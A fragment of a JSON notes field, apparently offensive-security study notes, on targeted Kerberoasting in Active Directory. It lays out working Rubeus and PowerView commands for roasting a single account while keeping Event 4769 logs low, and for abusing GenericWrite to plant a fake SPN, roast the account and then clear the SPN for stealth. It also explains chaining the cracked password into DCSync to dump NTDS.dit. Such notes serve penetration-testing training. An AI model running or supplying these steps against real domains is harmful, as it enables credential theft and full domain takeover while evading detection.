      "notes": "=== TWO USE CASES FOR TARGETED KERBEROASTING ===\n\n1. PICKING OFF A SPECIFIC HIGH-VALUE ACCOUNT\n   You know sqlsvc is a Domain Admin with a likely-weak password.\n   Roast just that one account to minimize Event 4769 logs:\n   .\\Rubeus.exe kerberoast /user:sqlsvc /nowrap\n\n2. TARGETED KERBEROASTING VIA GENERICWRITE (ACL ABUSE CHAIN) ===\n   If you have GenericWrite over an account (adunn), you can SET a fake SPN\n   on that account, making it Kerberoastable even if it wasn't before:\n\n   Step 1 — Set fake SPN on victim account:\n     Set-DomainObject -Credential $Cred2 -Identity adunn\n       -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose\n\n   Step 2 — Roast the now-kerberoastable account:\n     .\\Rubeus.exe kerberoast /user:adunn /nowrap\n\n   Step 3 — Clean up (critical for stealth):\n     Set-DomainObject -Credential $Cred2 -Identity adunn\n       -Clear serviceprincipalname -Verbose\n\n   This is the GenericWrite → Kerberoast → Crack chain that chains into DCSync\n   if the target account (adunn) has DCSync rights.\n\n=== WHY THIS CHAINS TO DCSYNC ===\nIf adunn has Replication-Get-Changes + Replication-Get-Changes-All rights on the\ndomain object (often via ACL inheritance), cracking adunn's password lets you\nrun secretsdump.py as adunn to dump the entire NTDS.dit.",
